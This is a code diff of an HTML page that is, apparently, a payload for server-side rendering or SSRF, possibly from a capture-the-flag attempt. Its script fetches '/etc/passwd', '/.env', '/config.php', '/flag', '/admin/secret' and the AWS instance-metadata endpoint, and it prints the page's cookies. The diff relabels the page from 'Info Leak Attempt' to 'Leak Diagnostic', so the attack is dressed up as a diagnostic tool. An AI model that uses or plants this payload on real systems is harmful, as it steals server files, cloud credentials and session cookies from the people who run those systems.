@@ -2,41 +2,49 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Info Leak Attempt</title>
+  <title>Leak Diagnostic</title>
   <style>
-    body { font-family: monospace; white-space: pre-wrap; }
+    body { font-family: monospace; white-space: pre-wrap; padding: 2em; background: #111; color: #0f0; }
+    h1 { color: #fff; }
   </style>
 </head>
 <body>
-<h1>Server Info Leak Attempt</h1>
-<div id="leak">Loading...</div>
+  <h1>Leak Diagnostic Page</h1>
+  <div id="output">Initializing...</div>
+  <script>
+    (async () => {
+      const output = document.getElementById('output');
+      let result = "";
 
-<script>
-(async () => {
-  let txt = '';
+      result += "✅ JS Executed Successfully\n\n";
 
-  // ננסה לקרוא קבצים פנימיים שאולי קיימים בשרת
-  const paths = [
-    '/etc/passwd',
-    '/.env',
-    '/config.php',
-    '/flag',
-    '/admin/secret',
-    'http://169.254.169.254/latest/meta-data/'  // metadata AWS
-  ];
+      result += "📍 Location: " + window.location.href + "\n\n";
+      result += "🧭 User Agent: " + navigator.userAgent + "\n\n";
+      result += "🍪 Cookies: " + document.cookie + "\n\n";
 
-  for (const path of paths) {
-    try {
-      const res = await fetch(path);
-      const data = await res.text();
-      txt += `== ${path} ==\n${data.slice(0, 500)}\n\n`;
-    } catch (e) {
-      txt += `== ${path} ==\nFetch failed: ${e.message}\n\n`;
-    }
-  }
+      const paths = [
+        '/etc/passwd',
+        '/.env',
+        '/flag',
+        '/admin/secret',
+        '/config.php',
+        'http://169.254.169.254/latest/meta-data/'
+      ];
 
-  document.getElementById("leak").textContent = txt;
-})();
-</script>
+      for (const path of paths) {
+        try {
+          result += `🌐 Trying to fetch: ${path}\n`;
+          const res = await fetch(path);
+          result += `🔁 Status: ${res.status} ${res.statusText}\n`;
+          const text = await res.text();
+          result += `📄 Content Preview (${text.length} bytes):\n${text.slice(0, 500)}\n\n`;
+        } catch (err) {
+          result += `❌ Fetch to ${path} failed: ${err.message}\n\n`;
+        }
+      }
+
+      output.textContent = result;
+    })();
+  </script>
 </body>
 </html>
